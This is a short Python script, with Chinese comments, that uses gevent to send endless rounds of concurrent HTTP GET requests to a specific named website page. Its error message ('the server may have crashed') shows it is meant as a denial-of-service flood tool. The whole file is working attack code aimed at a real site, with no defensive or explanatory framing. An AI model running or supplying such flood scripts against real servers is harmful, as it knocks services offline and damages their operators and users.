from gevent import monkey
monkey.patch_all()
import gevent.pool
import requests

def get_url(url):
    try:
        print(requests.get(url))
    except Exception as e:
        print('出错了，可能是服务器破溃了')

if __name__ == '__main__':
    host = 'https://www.jiubanyipeng.com/1114.html'  # 网站地址
    while True:
        res_l = []
        p = gevent.pool.Pool(1000)
        for i in range(1, 256):
            res_l.append(p.spawn(get_url, host))
        gevent.joinall(res_l)

